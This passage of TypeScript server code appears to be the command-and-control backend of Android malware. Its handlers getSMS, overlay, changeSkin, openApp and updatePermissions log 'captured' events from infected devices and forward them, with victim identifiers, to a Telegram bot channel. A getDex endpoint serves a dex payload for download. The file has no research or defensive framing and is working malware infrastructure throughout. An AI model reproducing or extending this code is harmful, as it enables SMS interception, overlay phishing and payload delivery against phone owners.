                        { caption: createFont(`🛡️ | captured #getSMS\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId, parse_mode: "HTML" }
                    );
                }
            } else {
                await scarlett.api.sendMessage(
                    port_info.stores_to,
                    createFont(`🛡️ | captured #getSMS\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🔴 | error: ${message.message}`)
                );
            }
        } catch (e) {
            console.error("[hooks:getSMS] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    changeSkin: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            const valid_data = classify.schemas.createBalanceSchema().validate(message.balance);

            if (valid_data.error) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid input data" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const encrypted_message = Realme.encrypt(JSON.stringify({ status: true }), {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            reply.send(encrypted_message);

            if (message.status) {
                if (message.type === "onCommand") {
                    let action_session = await classify.session.getSession(message.session_id);
                    if (action_session) {
                        await classify.session.removeSession(message.session_id);
                        await scarlett.api.editMessageText(
                            port_info.stores_to,
                            action_session.message_id,
                            createFont(`🛡️ | captured #${action_session.method}\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId,
                            { parse_mode: "HTML" }
                        );
                    }
                } else {
                    await scarlett.api.sendMessage(
                        port_info.stores_to,
                        createFont(`🛡️ | captured #changeSkin\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId,
                        { parse_mode: "HTML" }
                    );
                }
            } else {
                await scarlett.api.sendMessage(
                    port_info.stores_to,
                    createFont(`🛡️ | captured #changeSkin\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🔴 | error: ${message.message}`)
                );
            }
        } catch (e) {
            console.error("[hooks:changeSkin] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    overlay: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            const valid_data = classify.schemas.createBalanceSchema().validate(message.balance);

            if (valid_data.error) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid input data" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const encrypted_message = Realme.encrypt(JSON.stringify({ status: true }), {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            reply.send(encrypted_message);

            if (message.status) {
                if (message.type === "onCommand") {
                    let action_session = await classify.session.getSession(message.session_id);
                    if (action_session) {
                        await classify.session.removeSession(message.session_id);
                        await scarlett.api.editMessageText(
                            port_info.stores_to,
                            action_session.message_id,
                            createFont(`🛡️ | captured #${action_session.method}\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId,
                            { parse_mode: "HTML" }
                        );
                    }
                } else {
                    await scarlett.api.sendMessage(
                        port_info.stores_to,
                        createFont(`🛡️ | captured #overlay\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId,
                        { parse_mode: "HTML" }
                    );
                }
            } else {
                await scarlett.api.sendMessage(
                    port_info.stores_to,
                    createFont(`🛡️ | captured #overlay\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🔴 | error: ${message.message}`)
                );
            }
        } catch (e) {
            console.error("[hooks:overlay] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    openApp: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            const valid_data = classify.schemas.createBalanceSchema().validate(message.balance);

            if (valid_data.error) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid input data" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const encrypted_message = Realme.encrypt(JSON.stringify({ status: true }), {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            reply.send(encrypted_message);

            if (message.status) {
                if (message.type === "onCommand") {
                    let action_session = await classify.session.getSession(message.session_id);
                    if (action_session) {
                        await classify.session.removeSession(message.session_id);
                        await scarlett.api.editMessageText(
                            port_info.stores_to,
                            action_session.message_id,
                            createFont(`🛡️ | captured #${action_session.method}\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId,
                            { parse_mode: "HTML" }
                        );
                    }
                } else {
                    await scarlett.api.sendMessage(
                        port_info.stores_to,
                        createFont(`🛡️ | captured #openApp\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId,
                        { parse_mode: "HTML" }
                    );
                }
            } else {
                await scarlett.api.sendMessage(
                    port_info.stores_to,
                    createFont(`🛡️ | captured #openApp\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🔴 | error: ${message.message}`)
                );
            }
        } catch (e) {
            console.error("[hooks:openApp] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later" });
        }
    },

    updatePermissions: async (request: FastifyRequest, reply: FastifyReply) => {
        try {
            const body = request.body as any;
            const keys = Realme.storeServerKeys();

            const user = await classify.ceph.getClientById(body.signerId);

            if (!user) return reply.code(401).send({ status: false, message: "you are not allowed to use this service currently" });

            const result = Realme.decryptToString({
                algorithms: body.algorithms,
                authTag: body.authTag,
                ciphertext: body.ciphertext,
                encryptedKey: body.encryptedKey,
                iv: body.iv,
                recipient: "server",
                sender: "client",
                signature: body.signature,
                signedAt: body.signedAt,
                signerId: body.signerId
            }, {
                expectedRecipient: "server",
                senderPublicKey: createPublicKey(user.public_key),
                recipientPrivateKey: createPrivateKey(keys.privateKey),
                maxAgeMs: 15 * 60 * 1000,
            });

            const message = JSON.parse(result.plaintext);

            if (message.from_port !== user.from_port) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "inconsistency detected" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const port_info = await classify.portService.getPort(message.from_port);

            if (!port_info) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid port" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(403).send(encrypted_message);
            }

            if (port_info.status !== "active"){
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "your port is not active" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(500).send(encrypted_message);
            }

            const valid_data = classify.schemas.createCardSchema().validate(message.new_permissions);

            if (valid_data.error) {
                const encrypted_message = Realme.encrypt(
                    JSON.stringify({ status: false, message: "invalid input data" }),
                    {
                        recipient: "client",
                        sender: "server",
                        senderPrivateKey: createPrivateKey(keys.privateKey),
                        recipientPublicKey: createPublicKey(user.public_key),
                        signerId: "api-server-01"
                    }
                );
                return reply.code(401).send(encrypted_message);
            }

            const encrypted_message = Realme.encrypt(JSON.stringify({ status: true }), {
                recipient: "client",
                sender: "server",
                senderPrivateKey: createPrivateKey(keys.privateKey),
                recipientPublicKey: createPublicKey(user.public_key),
                signerId: "api-server-01"
            });

            reply.send(encrypted_message);

            if (message.status) {
                const updatedPermissions: any[] = message.new_permissions;
                const user_and_new_perms = new Set([...user.permissions, ...updatedPermissions]);
                if (user.permissions !== updatedPermissions) {
                    await classify.ceph.updateClient(user.id, { permissions: Array.from(user_and_new_perms) });
                }

                const use_in_text = updatedPermissions.map((val) => val.toLowerCase()).join(", ");

                if (message.type === "onCommand") {
                    let action_session = await classify.session.getSession(message.session_id);
                    if (action_session) {
                        await classify.session.removeSession(message.session_id);
                        await scarlett.api.editMessageText(
                            port_info.stores_to,
                            action_session.message_id,
                            createFont(`🛡️ | captured #${action_session.method}\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🚀 | updated permissions: ${use_in_text}`),
                            { parse_mode: "HTML" }
                        );
                    }
                } else {
                    await scarlett.api.sendMessage(
                        port_info.stores_to,
                        createFont(`🛡️ | captured #updatePermissions\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🚀 | updated permissions: ${use_in_text}`),
                        { parse_mode: "HTML" }
                    );
                }
            } else {
                await scarlett.api.sendMessage(
                    port_info.stores_to,
                    createFont(`🛡️ | captured #updatePermissions\n💡 | type: ${message.type}\n⏲️ | ${getNowJalali(getJalaliTime())}\n👤 | `) + '/set_' + body.signerId + createFont(`\n\n🔴 | error: ${message.message}`)
                );
            }
        } catch (e) {
            console.error("[hooks:updatePermissions] error:", e);
            return reply.code(500).send({ status: false, message: "server cause to error, sorry about this; try again later", _: (e as Error).message });
        }
    },

    getDex: async (request: FastifyRequest, reply: FastifyReply) => {
        reply.header("content-type", "application/octet-stream");
        reply.header("content-disposition", 'attachment; filename="dexfile.dex"');
        reply.header("content-length", dex_stat.size);
        return reply.send(
            createReadStream(dex_path)
        );
    }
}